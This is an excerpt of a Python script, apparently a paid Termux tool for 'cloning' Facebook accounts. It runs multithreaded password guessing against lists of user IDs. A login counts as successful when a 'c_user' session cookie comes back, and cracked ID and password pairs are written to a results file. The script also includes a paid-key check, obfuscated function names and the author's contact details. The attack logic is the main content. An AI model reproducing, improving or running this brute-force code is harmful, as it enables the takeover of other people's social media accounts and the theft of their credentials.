...
def logo():
 ...
 \033[1;92m_     _ _______ _     _ _______ _  ______ 
...
\033[1;93m                          Version -  XXX.0.5
\x1b[1;91m╭────────────────────────────────────────────╮
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Author     : YounisXD
\x1b[1;97m [\033[1;91m•\x1b[1;97m] WhatsApp   : +923404708884
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Facebook   : Helin  - CXXX2005
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Github     : YOUNIS-XXX-2005
\x1b[1;91m╰────────────────────────────────────────────╯
"""%(N))
...
def R():
	...
	try:
		...
		try:
			...
			______WASIXD______(" %s[%s•%s] Use These Tools Wisely "%(P,H,P));time.sleep(00.9)
			______WASIXD______(" %s[%s•%s] I'm Not Responsible If Something Happens "%(P,H,P));time.sleep(00.9)
			______WASI______(" %s[%s•%s] ENTER "%(P,H,P));time.sleep(3)
			_____bot________();___SayaRecodeSampah___()
		except KeyError:
			______WASIXD______(f'{P} [{M}!{P}] Expired Token')
			______LuWibu______() 
...
def __cekakun__():
    ...
    ______WASIXD______(f" {P}[{H}2{P}] Check Results CP ")
    anjg = ______WASI______(f" \n {P}[{H}?{P}] Chose : ")
    if anjg == '':
        ___SayaRecodeSampah___()
    elif anjg == '01' or anjg == '1':
        ______SAYANGKAMU______(' cat YOUNIS-OKtxt')
        ______WASI______('\n [\xe2\x80\xa2] Return ')
        ___SayaRecodeSampah___()
...
def __upgrade__():
	...
	______SAYANGKAMU______('am start https://wa.me/+923404708884?text=Assalamualaikum,+Younis+Upgrade+Premium+%20>/dev/null')
...
def _____LANGSUNG_____():
	______WASIXD______("")
	______WASIXD______(' %s[%s+%s] %sResults %sOK %sSaved to -> %sYOUNIS-OK.txt'%(p,p,p,p,p,p,H))
	______WASIXD______(' %s[%s+%s] %sResults %sCP %sRaved to -> %sYOUNIS-CP.txt'%(p,p,p,p,p,p,K))
	______QURESHI______(" %s[%s!%s] %sIf %sNo %sResults Flight-> %s5Sec\n"%(p,M,p,p,p,p,p))
...
def ____MANUAL_____():
	...
	if pwek=="":
		...
		______WASIXD______(' %s[%s+%s] %sResults %sOK %ssaved to -> %sYOUNIS-OK.txt'%(p,p,p,p,p,p,H))
		______WASIXD______(' %s[%s+%s] %sResults %sCP %sSaved to -> %sYOUNIS-CP.txt'%(p,p,p,p,p,p,K))
		with ThreadPoolExecutor(max_workers=30) as dicky:
			for user in id:
				uid, name = user.split("|")
...
def apii(uid, pwx):
	...
	for pw in pwx:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			______WASIXD______("\r %s[OK] %s • %s • %s         "%(H,uid, pw))
			...
			try:
				...
				open("YOUNIS-OK.txt","a").write("  * --> %s | %s  %s | %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
...
def ___SayaRecodeSampah___():
	...
	try:
		...
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	logo()
	______WASIXD______(f" {P}[{H}\033[1;91m•{P}] Name    : %s \n {P}[{H}\033[1;91m•{P}] ID      : %s \n {P}[{H}\033[1;91m•{P}] IP      : %s \n {P}[{H}\033[1;91m•{P}] Status  : {H}Premium Monthly{P}"%(Name,uid,_______IP_______))
	...
	elif ask in ['0','00','000','e']:______SAYANGKAMU______("rm -f login.txt");______QURESHI______(f" {P}[{H}✔{P}] Successfully Delete Token");______LuWibu______()
...
def main_apv():
    ...
    ak="YOUNISXXXX"
    logo()
    os.system('xdg-open https://youtube.com/channel/UCz1g6oRrkLBaC6zTZHq5pqw')
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.qureshi-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("\x1b[1;97m [\033[1;92m•\x1b[1;97m] \033[1;91mYour Token Is Not Approved Already")
        print ("")
        print ("     \t \033[1;93m[\x1b[1;97m\x1b[1;41m THIS PUBLIC CLONING TOOL IS PAID Rs-150 \x1b[0m\x1b[1;93m]")
        print ("")
        print ("\033[1;92m╭────────────────────────────────────────────╮")
        ...
        print ("")
        print ("")
        print ("\x1b[1;97m [\033[1;92m•\x1b[1;97m] Copy Key And Sent Me On WhatsApp Approve Your Key ")
        print ("\033[1;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923404708884")
        
    r1=requests.get("https://raw.githubusercontent.com/YOUNIS-XXX-2005/PUBLIC/main/XXXXXXXXX-PUBLIC").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
        ...
        print ("     \t \033[1;93m[\x1b[1;97m\x1b[1;41m THIS TOOL IS PAID Rs-150 \x1b[0m\x1b[1;93m]")
        print ("")
        print ("\033[1;92m╭────────────────────────────────────────────╮")
